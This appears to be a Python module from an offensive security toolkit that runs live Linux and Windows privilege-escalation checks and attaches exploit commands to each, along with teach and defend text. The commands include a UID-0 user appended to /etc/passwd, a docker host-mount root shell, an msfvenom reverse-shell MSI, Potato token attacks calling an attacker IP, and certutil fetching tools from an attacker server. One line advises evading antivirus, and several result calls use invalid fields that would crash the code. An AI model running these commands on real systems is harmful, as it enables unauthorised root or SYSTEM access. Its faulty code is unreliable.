#!/usr/bin/env python3
"""
ERR0RS ULTIMATE — Privilege Escalation Module
=============================================
Linux and Windows privesc paths — automated checks with teach/defend for each.

Checks covered:
  Linux:  SUID binaries, sudo abuse, writable cron, /etc/passwd writable,
          capabilities, PATH hijacking, NFS no_root_squash, docker group,
          LinPEAS runner, kernel exploit suggester
  Windows: AlwaysInstallElevated, unquoted service paths, weak service perms,
           token impersonation (PrintSpoofer/RoguePotato), DLL hijacking,
           SeImpersonatePrivilege check, WinPEAS runner

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import subprocess
import shutil
import os
import sys
import platform
from dataclasses import dataclass

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..'))


@dataclass
class PrivescResult:
    technique: str
    command: str
    output: str = ""
    error: str = ""
    vulnerable: bool = False
    exploit_cmd: str = ""
    teach: str = ""
    defend: str = ""


def _run(cmd: str, timeout: int = 30) -> tuple:
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return p.stdout.strip(), p.stderr.strip(), p.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", 1
    except Exception as e:
        return "", str(e), 1


# ─────────────────────────────────────────────────────────────────────
# LINUX PRIVESC CHECKS
# ─────────────────────────────────────────────────────────────────────

class LinuxPrivesc:

    def check_suid_binaries(self) -> PrivescResult:
        cmd = "find / -perm -4000 -type f 2>/dev/null | head -40"
        out, err, rc = _run(cmd, timeout=30)
        # Cross-reference with GTFOBins exploitable list
        gtfobins = [
            "bash","sh","find","nmap","vim","vi","python","python3","perl","ruby",
            "awk","gawk","sed","tee","cp","mv","cat","more","less","man","env",
            "curl","wget","tar","zip","unzip","php","lua","node","ftp","socat",
            "strace","base64","xxd","dd","openssl"
        ]
        vulnerable = False
        exploit_hints = []
        for line in out.splitlines():
            binary = os.path.basename(line.strip())
            if binary in gtfobins:
                vulnerable = True
                exploit_hints.append(f"  EXPLOITABLE: {line.strip()} → gtfobins.github.io/gtfobins/{binary}/")
        exploit_cmd = "\n".join(exploit_hints) if exploit_hints else "No known GTFOBins matches found."
        return PrivescResult(
            technique="Linux PrivEsc — SUID Binaries",
            command=cmd, output=out, error=err, vulnerable=vulnerable,
            exploit_cmd=exploit_cmd,
            teach=(
                "SUID (Set User ID) bit makes a binary run as its owner (often root) "
                "regardless of who executes it. If a SUID binary can be abused to "
                "run arbitrary commands (find, python, vim, bash...) you get a root shell. "
                "GTFOBins.github.io documents every exploitable SUID binary with exact commands."
            ),
            defend=(
                "Audit SUID binaries: find / -perm -4000 -ls. Remove SUID from "
                "anything that doesn't need it. noexec and nosuid mount flags on /tmp. "
                "Baseline SUID list and alert on new additions (FIM)."
            )
        )

    def check_sudo_l(self) -> PrivescResult:
        cmd = "sudo -l 2>/dev/null"
        out, err, rc = _run(cmd, timeout=10)
        vulnerable = bool(out) and "NOPASSWD" in out
        return PrivescResult(
            technique="Linux PrivEsc — Sudo Abuse",
            command=cmd, output=out or "[ERR0RS] No sudo rules or password required.",
            error=err, vulnerable=vulnerable,
            exploit_cmd=(
                "Check GTFOBins for each binary listed with NOPASSWD.\n"
                "Example: (ALL) NOPASSWD: /usr/bin/find\n"
                "  → sudo find . -exec /bin/bash \\;"
            ),
            teach=(
                "sudo -l lists what commands this user can run as root. "
                "NOPASSWD means no password prompt — instant privesc. "
                "Even 'safe' binaries like find, vim, python can spawn root shells. "
                "GTFOBins documents the exact command for every sudo-exploitable binary."
            ),
            defend=(
                "Principle of least privilege: only grant specific sudo commands needed. "
                "Audit sudoers regularly. Never use NOPASSWD for interactive users. "
                "Use sudoedit for file editing instead of vim/nano with full sudo."
            )
        )

    def check_writable_etc_passwd(self) -> PrivescResult:
        cmd = "ls -la /etc/passwd"
        out, err, rc = _run(cmd)
        vulnerable = bool(out) and ("w" in out.split()[0][4:7] or "w" in out.split()[0][7:])
        return PrivescResult(
            technique="Linux PrivEsc — Writable /etc/passwd",
            command=cmd, output=out, error=err, vulnerable=vulnerable,
            exploit_cmd=(
                "echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd\n"
                "su hacker  # password: password"
            ),
            teach=(
                "If /etc/passwd is world-writable, you can add a user with UID 0 (root). "
                "The format: username:password_hash:uid:gid:info:home:shell. "
                "UID 0 = root regardless of username. "
                "Classic misconfiguration on legacy or CTF machines."
            ),
            defend=(
                "Correct permissions: 644, owned by root. "
                "chattr +i /etc/passwd to make immutable. "
                "FIM alert on any write to /etc/passwd. "
                "Use shadow passwords — /etc/passwd should never contain hashes."
            )
        )

    def check_capabilities(self) -> PrivescResult:
        cmd = "getcap -r / 2>/dev/null | head -20"
        out, err, rc = _run(cmd, timeout=20)
        dangerous_caps = ["cap_setuid", "cap_net_bind_service", "cap_sys_admin", "cap_dac_override"]
        vulnerable = any(c in (out or "").lower() for c in dangerous_caps)
        return PrivescResult(
            technique="Linux PrivEsc — Linux Capabilities",
            command=cmd, output=out or "[ERR0RS] No special capabilities found.",
            error=err, vulnerable=vulnerable,
            exploit_cmd=(
                "If python3 has cap_setuid+ep:\n"
                "  python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
            ),
            teach=(
                "Linux capabilities give binaries specific root-level powers without full root. "
                "cap_setuid lets a binary change its UID (= instant root shell). "
                "cap_dac_override bypasses file permission checks (read anything). "
                "cap_sys_admin is almost as powerful as full root."
            ),
            defend=(
                "Audit: getcap -r / on all systems regularly. "
                "Remove unnecessary capabilities: setcap -r /path/to/binary. "
                "Never set cap_setuid on scripting languages. "
                "Alert on capability changes with auditd."
            )
        )

    def check_docker_group(self) -> PrivescResult:
        cmd = "id | grep -i docker 2>/dev/null"
        out, err, rc = _run(cmd)
        vulnerable = bool(out)
        return PrivescResult(
            technique="Linux PrivEsc — Docker Group Escape",
            command=cmd, out=out or "Not in docker group.", error=err, vulnerable=vulnerable,
            exploit_cmd=(
                "docker run -it --rm -v /:/mnt alpine chroot /mnt /bin/bash\n"
                "# Now you have a root shell with access to the HOST filesystem"
            ),
            teach=(
                "Docker group = root. Full stop. Any user in the docker group can "
                "mount the host filesystem into a container and get a root shell. "
                "This is a documented, well-known, trivially exploitable privesc. "
                "Treat docker group membership the same as root access."
            ),
            defend=(
                "Never add users to the docker group as a convenience. "
                "Use rootless Docker instead. "
                "Implement Docker socket proxies (Traefik, docker-socket-proxy). "
                "Alert on new docker group members."
            )
        )

    def run_linpeas(self) -> PrivescResult:
        if shutil.which("linpeas.sh") or os.path.exists("/tmp/linpeas.sh"):
            cmd = "bash /tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt | head -100"
        else:
            cmd = (
                "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest"
                "/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null && "
                "chmod +x /tmp/linpeas.sh && bash /tmp/linpeas.sh | tee /tmp/linpeas_output.txt | head -100"
            )
        out, err, rc = _run(cmd, timeout=120)
        return PrivescResult(
            technique="Linux PrivEsc — LinPEAS Full Scan",
            command=cmd, output=out or "[ERR0RS] LinPEAS failed or no output.",
            error=err, vulnerable=False,
            exploit_cmd="Review /tmp/linpeas_output.txt for highlighted findings.",
            teach=(
                "LinPEAS is the gold standard Linux privilege escalation scanner. "
                "It checks SUID/SGID, sudo rules, writable paths, cron jobs, "
                "capabilities, network info, running services, container escapes, "
                "and 200+ more checks. Red = critical finding. Yellow = interesting."
            ),
            defend=(
                "Run LinPEAS against your own systems in authorized assessments. "
                "Remediate every RED finding. EDR detects LinPEAS download/execution "
                "by behavior — curl from shell, rapid /proc reads."
            )
        )

    def run_all_checks(self) -> list:
        checks = [
            self.check_suid_binaries(),
            self.check_sudo_l(),
            self.check_writable_etc_passwd(),
            self.check_capabilities(),
            self.check_docker_group(),
        ]
        return checks


# ─────────────────────────────────────────────────────────────────────
# WINDOWS PRIVESC CHECKS
# ─────────────────────────────────────────────────────────────────────

class WindowsPrivesc:

    def check_always_install_elevated(self) -> PrivescResult:
        cmd = (
            'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer '
            '/v AlwaysInstallElevated 2>nul && '
            'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer '
            '/v AlwaysInstallElevated 2>nul'
        )
        out, err, rc = _run(cmd)
        vulnerable = "0x1" in out
        return PrivescResult(
            technique="Windows PrivEsc — AlwaysInstallElevated",
            command=cmd, output=out, error=err, vulnerable=vulnerable,
            exploit_cmd=(
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.msi\n"
                "msiexec /quiet /qn /i evil.msi"
            ),
            teach=(
                "When AlwaysInstallElevated is set in BOTH registry hives, "
                "any .MSI package installs with SYSTEM privileges — regardless "
                "of who runs it. Create a malicious MSI with msfvenom and run it "
                "as any user to get a SYSTEM shell. Instant privesc."
            ),
            defend=(
                "Disable AlwaysInstallElevated: both HKLM and HKCU must be 0. "
                "Use Software Restriction Policies or AppLocker to control MSI execution. "
                "Alert on msiexec running from unexpected user/path combinations."
            )
        )

    def check_unquoted_service_paths(self) -> PrivescResult:
        cmd = (
            'wmic service get Name,PathName,StartMode 2>nul | '
            'findstr /i "auto" | findstr /iv """'
        )
        out, err, rc = _run(cmd, timeout=20)
        vulnerable = bool(out and "Program Files" in out)
        return PrivescResult(
            technique="Windows PrivEsc — Unquoted Service Paths",
            command=cmd, output=out or "[ERR0RS] No unquoted paths found (or wmic unavailable).",
            error=err, vulnerable=vulnerable,
            exploit_cmd=(
                "If path is: C:\\Program Files\\My App\\service.exe\n"
                "Create: C:\\Program.exe (malicious binary)\n"
                "Restart the service → Windows runs Program.exe as SYSTEM"
            ),
            teach=(
                "When a Windows service path contains spaces but isn't quoted, "
                "Windows parses it in order: C:\\Program.exe, then "
                "C:\\Program Files\\My.exe, then the real binary. "
                "If you can write to C:\\ or C:\\Program Files\\, place a "
                "malicious binary in the search path. Restart the service = SYSTEM shell."
            ),
            defend=(
                "Always quote service binary paths in quotes in services config. "
                "Audit: Get-WmiObject Win32_Service | Where-Object { $_.PathName -notmatch '\"' }. "
                "Restrict write access to C:\\ and Program Files for non-admins."
            )
        )

    def check_se_impersonate(self) -> PrivescResult:
        cmd = "whoami /priv 2>nul | findstr /i impersonate"
        out, err, rc = _run(cmd)
        vulnerable = "Enabled" in out
        return PrivescResult(
            technique="Windows PrivEsc — SeImpersonatePrivilege (Potato Attacks)",
            command=cmd, output=out or "[ERR0RS] SeImpersonatePrivilege not enabled.",
            error=err, vulnerable=vulnerable,
            exploit_cmd=(
                "# Windows 10/Server 2019+: PrintSpoofer\n"
                ".\\PrintSpoofer64.exe -i -c cmd\n\n"
                "# Older: JuicyPotato\n"
                ".\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t * -c {CLSID}\n\n"
                "# Modern: RoguePotato\n"
                ".\\RoguePotato.exe -r <attacker_ip> -e \"cmd.exe\" -l 9999"
            ),
            teach=(
                "SeImpersonatePrivilege lets a process impersonate any logged-in user's token. "
                "Service accounts (IIS, MSSQL, WinRM) often have this. "
                "Potato attacks trick SYSTEM to connect to your process, "
                "then steal its token. PrintSpoofer is the modern go-to on Win10+. "
                "JuicyPotato works on older systems. Both give SYSTEM shell."
            ),
            defend=(
                "Remove SeImpersonatePrivilege from service accounts that don't need it. "
                "Windows Defender detects most Potato variants by binary hash. "
                "Credential Guard limits token abuse. "
                "Use gMSA (Group Managed Service Accounts) instead of static service account passwords."
            )
        )

    def run_winpeas(self) -> PrivescResult:
        winpeas_paths = [
            "C:\\Windows\\Temp\\winpeas.exe",
            "C:\\Temp\\winpeas.exe",
            os.path.expanduser("~\\winpeas.exe")
        ]
        found = next((p for p in winpeas_paths if os.path.exists(p)), None)
        if found:
            cmd = f"{found} 2>nul"
        else:
            cmd = (
                "# WinPEAS not found. Transfer it:\n"
                "# Attacker: python3 -m http.server 8080\n"
                "# Target:   certutil -urlcache -f http://<attacker>/winpeas.exe C:\\Temp\\winpeas.exe\n"
                "# Then run: C:\\Temp\\winpeas.exe"
            )
        out, err, rc = _run(cmd, timeout=120)
        return PrivescResult(
            technique="Windows PrivEsc — WinPEAS Full Scan",
            command=cmd, output=out or "[ERR0RS] WinPEAS not found locally.",
            error=err, vulnerable=False,
            exploit_cmd="Review WinPEAS output. Red = critical. Yellow = interesting.",
            teach=(
                "WinPEAS is the Windows equivalent of LinPEAS. It checks: "
                "AlwaysInstallElevated, unquoted paths, weak service perms, "
                "stored credentials, scheduled tasks, registry autoruns, "
                "and 100+ more checks. Essential first step after initial access."
            ),
            defend=(
                "Run WinPEAS in authorized assessments against your own systems. "
                "Remediate every red finding. EDR detects WinPEAS by behavior "
                "and hash — use it fast before AV catches it in real engagements."
            )
        )

    def run_all_checks(self) -> list:
        return [
            self.check_always_install_elevated(),
            self.check_unquoted_service_paths(),
            self.check_se_impersonate(),
        ]


# ─────────────────────────────────────────────────────────────────────
# MASTER CONTROLLER
# ─────────────────────────────────────────────────────────────────────

class PrivescController:
    """Single entry point for privilege escalation module."""

    def __init__(self):
        self.linux   = LinuxPrivesc()
        self.windows = WindowsPrivesc()
        self._is_windows = (platform.system() == "Windows")

    def run(self, action: str, params: dict = None) -> PrivescResult:
        params = params or {}
        a = action.strip().lower()

        linux_map = {
            "suid":        self.linux.check_suid_binaries,
            "sudo":        self.linux.check_sudo_l,
            "etc_passwd":  self.linux.check_writable_etc_passwd,
            "caps":        self.linux.check_capabilities,
            "docker":      self.linux.check_docker_group,
            "linpeas":     self.linux.run_linpeas,
        }
        windows_map = {
            "aie":               self.windows.check_always_install_elevated,
            "unquoted":          self.windows.check_unquoted_service_paths,
            "seimpersonate":     self.windows.check_se_impersonate,
            "winpeas":           self.windows.run_winpeas,
        }

        if a == "all":
            checks = (self.windows.run_all_checks() if self._is_windows
                      else self.linux.run_all_checks())
            # Return the most critical (vulnerable) finding
            for c in checks:
                if c.vulnerable:
                    return c
            return checks[0] if checks else PrivescResult("All Checks", "multiple",
                output="[ERR0RS] No obvious privesc vectors found. Try linpeas/winpeas for deep scan.",
                success=False)

        combined = {**linux_map, **windows_map}
        if a in combined:
            return combined[a]()

        return PrivescResult("Unknown", action,
            output=f"[ERR0RS] Unknown privesc action '{a}'. "
                   f"Valid: {', '.join(combined.keys())}, all",
            vulnerable=False)


PRIVESC_WIZARD_MENU = {
    "title": "ERR0RS // PRIVILEGE ESCALATION WIZARD",
    "options": [
        {"key": "1", "label": "Run ALL Checks (auto-detect OS)",            "action": "all"},
        {"key": "2", "label": "[Linux] SUID Binary Check + GTFOBins",       "action": "suid"},
        {"key": "3", "label": "[Linux] Sudo Rules (sudo -l)",               "action": "sudo"},
        {"key": "4", "label": "[Linux] Writable /etc/passwd",               "action": "etc_passwd"},
        {"key": "5", "label": "[Linux] Linux Capabilities (getcap)",        "action": "caps"},
        {"key": "6", "label": "[Linux] Docker Group Escape",                "action": "docker"},
        {"key": "7", "label": "[Linux] LinPEAS Full Scan",                  "action": "linpeas"},
        {"key": "8", "label": "[Windows] AlwaysInstallElevated",            "action": "aie"},
        {"key": "9", "label": "[Windows] Unquoted Service Paths",           "action": "unquoted"},
        {"key": "10","label": "[Windows] SeImpersonatePrivilege (Potato)",  "action": "seimpersonate"},
        {"key": "11","label": "[Windows] WinPEAS Full Scan",                "action": "winpeas"},
    ]
}

if __name__ == "__main__":
    ctrl = PrivescController()
    print("[ERR0RS] Privilege Escalation Module OK")
    r = ctrl.run("sudo")
    print(f"Technique  : {r.technique}")
    print(f"Vulnerable : {r.vulnerable}")
    print(f"Output     : {r.output[:200]}")
    print(f"\n[TEACH]  {r.teach[:200]}")
    print(f"[DEFEND] {r.defend[:200]}")
